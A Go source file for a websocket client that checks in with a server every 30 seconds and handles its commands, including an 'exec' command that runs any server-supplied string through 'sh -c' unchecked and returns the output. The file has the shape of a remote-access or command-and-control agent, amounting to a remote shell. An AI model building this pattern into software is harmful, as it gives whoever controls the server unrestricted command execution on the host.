package common

import (
	"fmt"
	"log"
	"os/exec"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// Command types
const (
	CmdPing   = "ping"
	CmdExec   = "exec"
	CmdFetch  = "fetch"
	CmdUpload = "upload"
)

// Command represents a command to be executed
type Command struct {
	Type    string            `json:"type"`
	Args    map[string]string `json:"args"`
	ID      string            `json:"id"`
	Timeout int               `json:"timeout"`
}

// Response represents a command response
type Response struct {
	CommandID string `json:"command_id"`
	Status    string `json:"status"`
	Output    string `json:"output"`
	Error     string `json:"error,omitempty"`
}

// Client represents a connected client
type Client struct {
	ID           string
	ServerURL    string
	Conn         *websocket.Conn
	LastCheckin  time.Time
	CommandQueue map[string]Command
	Mu           sync.Mutex
}

// NewClient creates a new client instance
func NewClient(id, serverURL string) *Client {
	return &Client{
		ID:           id,
		ServerURL:    serverURL,
		CommandQueue: make(map[string]Command),
	}
}

// StartHeartbeat starts sending periodic ping messages
func (c *Client) StartHeartbeat() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		cmd := Command{
			Type: CmdPing,
			ID:   fmt.Sprintf("heartbeat-%d", time.Now().Unix()),
		}

		c.Mu.Lock()
		if err := c.Conn.WriteJSON(cmd); err != nil {
			log.Printf("Error sending heartbeat: %v", err)
		}
		c.Mu.Unlock()
	}
}

// HandleCommand processes a command from the server
func (c *Client) HandleCommand(cmd Command) {
	var response Response
	response.CommandID = cmd.ID

	switch cmd.Type {
	case CmdPing:
		response.Status = "success"
		response.Output = "pong"
	case CmdExec:
		output, err := exec.Command("sh", "-c", cmd.Args["command"]).CombinedOutput()
		if err != nil {
			response.Status = "error"
			response.Error = err.Error()
		} else {
			response.Status = "success"
			response.Output = string(output)
		}
	default:
		response.Status = "error"
		response.Error = "unknown command type"
	}

	c.Mu.Lock()
	defer c.Mu.Unlock()

	if err := c.Conn.WriteJSON(response); err != nil {
		log.Printf("Error sending response: %v", err)
	}
}
